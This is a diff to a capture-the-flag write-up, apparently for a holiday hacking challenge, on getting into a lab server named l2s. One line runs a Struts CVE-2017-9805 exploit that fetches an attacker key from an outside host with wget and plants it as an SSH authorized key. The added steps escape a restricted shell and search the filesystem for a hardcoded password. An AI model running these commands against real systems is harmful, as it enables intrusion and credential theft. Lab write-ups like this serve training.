@@ -282,6 +282,84 @@ Used the Python tool in the SANS blog post:
 python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'
 #+END_SRC
 
+*** Finding the password for alabaster_snowball 
+
+Login using ssh, but explicitly run bash, bypassing the rbash restriction
+
+#+BEGIN_SRC sh
+$ ssh alabaster_snowball@dev.northpolechristmastown.com -t bash
+#+END_SRC
+
+First, fix the shells path.  We can grab what a normal path looks like from /etc/profile:
+
+#+BEGIN_SRC sh
+alabaster_snowball@l2s:~$ grep PATH /etc/profile
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+export PATH
+alabaster_snowball@l2s:~$ PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+#+END_SRC
+
+Find all small files owned by alabaster_snowball on the main filesystem and search them for the string password.
+Start small and double the filesize each time to keep the process fast.
+
+#+BEGIN_SRC sh
+alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -1k 2>/dev/null |xargs grep passwor
+alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -2k 2>/dev/null |xargs grep passwor
+alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -4k 2>/dev/null |xargs grep passwor
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = "stream_unhappy_buy_loss";
+#+END_SRC
+
+We could have also searched for the username to find intersting files:
+
+#+BEGIN_SRC sh
+    $ time grep alabaster_snowball -r /opt/
+    /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
+
+    real	0m0.355s
+    user	0m0.300s
+    sys	0m0.052s
+#+END_SRC
+
+* Using ripgrep
+
+Ripgrep is a super fast grep replacement written in rust.
+It does a better job at filtering binary files, so we can run this command that finishes in about a second:
+
+#+BEGIN_SRC sh
+    $ mkdir /tmp/.rg
+    $ cd /tmp/.rg
+    $ wget https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
+    $ tar xvzf ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
+    $ find / -type f -xdev -user alabaster_snowball 2>/dev/null | xargs ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
+    /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
+    3:            final String username = "alabaster_snowball";
+    4-            final String password = "stream_unhappy_buy_loss";
+#+END_SRC
+
+If we didn't think to only look in our files, it only takes 4 seconds to search
+the entire filesystem.  After ignoring proc and some debian package info, only
+a few lines are output.
+
+#+BEGIN_SRC sh
+    $ time ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster / --no-messages |grep -v /proc|grep -v deb.debian.org
+    /etc/crontab:#@reboot root /usr/bin/nohup /usr/bin/sudo -u alabaster_snowball /opt/apache-tomcat/start_tomcat.sh &
+    /etc/subuid:alabaster_snowball:296608:65536
+    /etc/passwd:alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
+    /etc/group:alabaster_snowball:x:1004:
+    /etc/subgid:alabaster_snowball:296608:65536
+    /etc/systemd/system/tomcat.service:User=alabaster_snowball
+    /etc/systemd/system/tomcat.service:Group=alabaster_snowball
+    /usr/share/dh-python/dist/cpython3_fallback:alabaster python3-alabaster
+    /usr/share/dh-python/dist/cpython2_fallback:alabaster python-alabaster
+    /usr/lib/google-cloud-sdk/platform/gsutil/third_party/pyasn1/doc/source/conf.py:# html_theme = 'alabaster'
+    /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
+
+    real	0m4.095s
+    user	0m1.864s
+    sys	0m18.808s
+#+END_SRC
+
 #+BEGIN_SRC sh
 ssh l2s | tee nmap.out
 #+END_SRC
